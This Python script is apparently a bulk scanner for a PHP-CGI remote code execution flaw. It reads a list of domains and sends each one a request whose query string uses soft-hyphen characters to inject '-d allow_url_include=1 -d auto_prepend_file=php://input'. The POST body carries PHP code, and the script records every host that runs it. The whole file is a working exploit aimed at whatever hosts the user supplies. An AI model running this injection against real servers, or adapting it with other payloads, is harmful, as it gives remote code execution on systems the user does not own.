import sys, os, threading, requests, time
from urllib.parse import urlparse
from colorama import Fore
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_valid = []
_thmax = 0

def _check(_host, _tmout):
    global _thmax, _valid
    
    _thmax += 1
        
    try:
        if not (_host.lower().startswith("http://") or _host.lower().startswith("https://")):
            _host = "http://" + _host

        _domain = urlparse(_host).netloc
        
        url = f"http://{_domain}/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
        
        headers = {
            "User-Agent": "curl/8.3.0",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "keep-alive"
        }
        
        data = "<?php phpinfo(); ?>"
        
        response = requests.post(url, headers=headers, data=data, timeout=int(_tmout), verify=False)
        
        if "PHP Version" in response.text:
            _valid.append(_domain)
            print(Fore.GREEN + f" [+] Host {_domain} appears vulnerable!")
        else:
            print(Fore.RED + f" [-] Host {_domain} not vulnerable!")
        
    except Exception as e:
        print(Fore.YELLOW + f" [!] Connection to host {_domain} timed out...")
    
    _thmax -= 1

def main():
    global _thmax, _valid
    os.system('clear')
    
    print(Fore.WHITE + '''
  ___ _  _ ___     ___  ___ ___   ___  ___   _   _  _ _  _ ___ ___ 
 | _ \ || | _ \___| _ \/ __| __| / __|/ __| /_\ | \| | \| | __| _ \\
 |  _/ __ |  _/___|   / (__| _|  \__ \ (__ / _ \| .` | .` | _||   /
 |_| |_||_|_|     |_|_\\\___|___| |___/\___/_/ \_\_|\_|_|\_|___|_|_\\
       _____   _____   ___ __ ___ _ _      _ _  ___ ____ ____
      / __\ \ / / __|_|_  )  \_  ) | | ___| | || __|__  |__  |
     | (__ \ V /| _|___/ / () / /|_  _|___|_  _|__ \ / /  / /
      \___| \_/ |___| /___\__/___| |_|      |_||___//_/  /_/          
''')
    try:
        _file = input(' List of hosts to scan (ex- /home/domains.txt): ').strip()
        _thdz = int(input(' Threads to use (default 5): ').strip() or 5)
        _time = input(' Timeout (sec): ').strip()
        
        input('\r\n Ready? Strike <ENTER> to scan, and <CTRL+C> to abort...\r\n')
    except KeyboardInterrupt:
        sys.exit()
    except:
        main()

    try:
        with open(_file, 'r') as file:
            for line in file:
                line = line.strip()
                
                _check(line, _time)
                
                while True:
                    if _thmax < _thdz:
                        break
    except KeyboardInterrupt:
        pass
    except:
        sys.exit("\r\n Error reading file!\r\n")

    if _valid:
        with open('output.txt', 'w') as file:
            for _site in _valid:
                file.write(_site + '\n')

    sys.exit(Fore.WHITE + '\r\n Complete!')

if __name__ == "__main__":
    main()
